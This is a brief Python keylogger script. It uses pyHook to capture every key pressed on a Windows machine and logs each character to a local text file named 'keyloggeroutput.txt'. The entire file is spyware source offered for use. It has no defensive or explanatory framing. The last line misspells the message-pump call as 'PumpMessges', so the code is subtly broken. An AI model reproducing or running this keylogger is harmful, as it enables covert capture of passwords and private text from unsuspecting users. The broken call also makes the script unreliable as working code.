import pyHook, pythoncom, sys, logging
#feel free to set the file log to a different file name/location 
file_log = 'keyloggeroutput.txt' 
def OnkeyboardEvent(event):
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    logging.log(10, chr(event.Ascii))
    return True
hooks_manager = pyHook.HookManager ()
hooks_manager.KeyDown = OnkeyboardEvent 
hooks_manager.HookKeyboard() 
pythoncom.PumpMessges()
